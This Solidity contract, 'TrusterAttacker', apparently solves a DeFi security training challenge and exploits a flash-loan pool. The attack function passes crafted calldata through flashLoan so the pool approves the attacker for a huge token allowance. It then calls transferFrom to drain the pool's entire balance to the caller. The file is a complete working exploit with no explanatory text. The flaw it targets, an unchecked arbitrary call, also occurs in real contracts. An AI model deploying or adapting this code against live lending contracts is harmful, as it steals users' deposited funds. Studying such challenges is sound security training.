// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "./TrusterLenderPool.sol";

contract TrusterAttacker {
    IERC20 public token;
    TrusterLenderPool public pool;
    uint256 approveAmount = 5000000000000000000000000000000000000000000000;

    constructor(address _pool, address _token) {
        pool = TrusterLenderPool(_pool);
        token = IERC20(_token);
    }

    function attack() public {
        bytes memory data = abi.encodeWithSignature(
            "approve(address,uint256)",
            address(this),
            approveAmount
        );
        pool.flashLoan(0, msg.sender, address(token), data);

        token.transferFrom(
            address(pool),
            msg.sender, token.balanceOf(address(pool))
        );
    }
}
